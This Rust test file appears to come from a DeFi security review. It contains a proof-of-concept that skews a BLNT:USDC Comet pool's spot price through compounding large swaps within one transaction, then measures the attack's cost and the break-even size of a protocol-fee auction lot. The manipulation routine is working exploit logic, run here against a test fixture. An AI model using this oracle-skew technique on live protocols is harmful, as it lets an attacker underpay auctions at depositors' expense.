#![cfg(test)]
#![allow(clippy::zero_prefixed_literal)]

use soroban_sdk::Address;
use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};

/// Measure the cost of a single-transaction round-trip skew of the BLNT:USDC
/// Comet anchor, as a function of how many compounding max-ratio swaps the
/// attacker uses. Reports the achieved spot multiple, USDC burned, and peak
/// capital deployed.
#[test]
fn poc_manipulation_cost_curve() {
    for swaps in 1..=5u32 {
        let fixture = create_fixture_with_data(false);
        let e = fixture.env.clone();
        let blnt = &fixture.tokens[TokenIndex::BLNT];
        let usdc = &fixture.tokens[TokenIndex::USDC];
        let attacker: Address = fixture.users[0].clone();

        let honest = fixture.backstop.blnt_price();
        usdc.mint(&attacker, &(20_000_000 * SCALAR_7));
        let usdc_before = usdc.balance(&attacker);
        let blnt_before = blnt.balance(&attacker);

        let mut deployed = 0i128;
        for _ in 0..swaps {
            let reserve = fixture.lp.get_balance(&usdc.address);
            let amt = reserve / 4;
            deployed += amt;
            fixture.lp.swap_exact_amount_in(
                &usdc.address,
                &amt,
                &blnt.address,
                &0,
                &i128::MAX,
                &attacker,
            );
        }
        let skewed = fixture.backstop.blnt_price();

        let mut blnt_left = blnt.balance(&attacker) - blnt_before;
        while blnt_left > 0 {
            let reserve = fixture.lp.get_balance(&blnt.address);
            let amt = core::cmp::min(blnt_left, reserve / 4);
            if amt == 0 {
                break;
            }
            fixture.lp.swap_exact_amount_in(
                &blnt.address,
                &amt,
                &usdc.address,
                &0,
                &i128::MAX,
                &attacker,
            );
            blnt_left -= amt;
        }
        let cost = usdc_before - usdc.balance(&attacker);
        let restored = fixture.backstop.blnt_price();
        // A protocol-fee bid shrinks by exactly the spot multiple, so the
        // attacker's saving on a lot of value V is 1.2*V*(1 - honest/skewed).
        let saving_bps_of_lot = 12_000i128 * (skewed - honest) / skewed;
        let breakeven_lot = cost * 10_000 / saving_bps_of_lot;
        std::println!(
            "swaps={} multiple={}.{:02}x  usdc_deployed=${}  usdc_cost=${}  \
             saving={}bps of lot  breakeven_lot=${}  restored={}",
            swaps,
            skewed / honest,
            (skewed % honest) * 100 / honest,
            deployed / SCALAR_7,
            cost / SCALAR_7,
            saving_bps_of_lot,
            breakeven_lot / SCALAR_7,
            restored,
        );
        let _ = e;
    }
}
